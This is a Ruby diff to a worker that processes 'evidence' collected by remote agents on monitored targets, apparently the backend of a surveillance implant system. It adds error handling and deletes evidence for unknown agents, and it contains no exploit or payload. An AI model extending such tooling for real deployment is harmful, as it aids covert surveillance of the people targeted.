@@ -33,6 +33,18 @@ end
 module RCS
 module Worker
 
+class InvalidAgentTarget < StandardError
+  attr_reader :msg
+
+  def initialize(msg)
+    @msg = msg
+  end
+
+  def to_s
+    @msg
+  end
+end
+
 class InstanceWorker
   include RCS::Tracer
   
@@ -40,7 +52,7 @@ class InstanceWorker
 
   def get_agent_target
     @agent = Item.agents.where({ident: @ident, instance: @instance}).first
-    raise "Agent \'#{@ident}:#{@instance}\' cannot be found." if @agent.nil?
+    raise InvalidAgentTarget.new("Agent \'#{@ident}:#{@instance}\' cannot be found.") if @agent.nil?
     @target = @agent.get_parent
   end
   
@@ -51,12 +63,19 @@ class InstanceWorker
     @state = :running
     @seconds_sleeping = 0
     @semaphore = Mutex.new
-    
+
     # get info about the agent instance from evidence db
-    get_agent_target
+    # if agent/target is not found, delete all the evidences (cannot be inserted anyway)
+    begin
+      get_agent_target
+    rescue InvalidAgentTarget => e
+      trace :error, "Cannot find agent #{ident}:#{instance}, deleting all related evidence."
+      RCS::DB::GridFS.delete_by_filename("#{ident}:#{instance}", "evidence")
+      return
+    end
 
     trace :info, "Created processor for agent #{@agent['ident']}:#{@agent['instance']} (target #{@target['_id']})"
-    
+
     # the log key is passed as a string taken from the db
     # we need to calculate the MD5 and use it in binary form
     @key = Digest::MD5.digest @agent['logkey']
@@ -130,7 +149,13 @@ class InstanceWorker
               ev_type = ev[:type]
 
               # get info about the agent instance from evidence db
-              get_agent_target
+              begin
+                get_agent_target
+              rescue InvalidAgentTarget => e
+                trace :error, "Cannot find agent #{ident}:#{instance}, deleting all related evidence."
+                RCS::DB::GridFS.delete_by_filename("#{ident}:#{instance}", "evidence")
+                return
+              end
 
               processor = case ev[:type]
                             when :call
@@ -154,7 +179,7 @@ class InstanceWorker
                 end
                 
                 # forward raw evidence
-                #RCS::DB::Connectors.new_raw(raw_id, index, @agent, evidence_id)
+                #RCS::DB::Connectors.new_raw(raw_id, index, @agent, evidence_id) unless evidence_id.nil?
                 
                 # delete raw evidence
                 RCS::DB::GridFS.delete(raw_id, "evidence")
@@ -176,10 +201,10 @@ class InstanceWorker
           rescue Exception => e
             trace :fatal, "[#{raw_id}:#{@ident}:#{@instance}] Unrecoverable error processing evidence #{raw_id}."
             trace :debug, "[#{raw_id}:#{@ident}:#{@instance}] EXCEPTION: " + e.backtrace.join("\n")
-            
+
             Dir.mkdir "forwarded" unless File.exists? "forwarded"
             path = "forwarded/#{raw_id}.raw"
-            f = File.open(path, 'wb') {|f| f.write raw}
+            f = File.open(path, 'wb') {|f| f.write decoded_data}
             trace :debug, "[#{raw_id}] forwarded undecoded evidence #{raw_id} to #{path}"
           end
         end
